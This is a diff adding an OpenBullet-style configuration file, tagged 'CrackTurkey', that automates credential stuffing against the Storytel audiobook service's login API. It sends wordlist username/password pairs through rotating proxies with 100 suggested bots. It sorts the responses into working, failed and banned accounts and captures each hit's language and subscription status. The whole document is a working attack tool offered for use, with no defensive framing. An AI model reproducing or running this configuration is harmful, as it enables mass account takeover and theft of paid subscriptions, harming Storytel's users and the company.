@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "Storytel",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-23T13:10:18.9008949+03:00",
+  "AdditionalInfo": "",
+  "Author": "Raymond",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Arkada HTTP DEBUGGER Açıkken Tarayın",
+      "VariableName": "",
+      "Id": 364836589
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CrackTurkey REQUEST POST "https://www.storytel.se/api/login.action?uid=<USER>&pwd=<PASS>&token=guesttr&version=6.13.7&terminal=android&locale=tr&kidsMode=false" 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.storytel.se" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CrackTurkey KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+    KEY "<RESPONSECODE>" Contains "500" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "message\":null,\"" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "\"localizedName\":\"" "\"" CreateEmpty=FALSE -> CAP "Dil" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "\"message\":\"" "\"" CreateEmpty=FALSE -> CAP "Abonelik" 
+
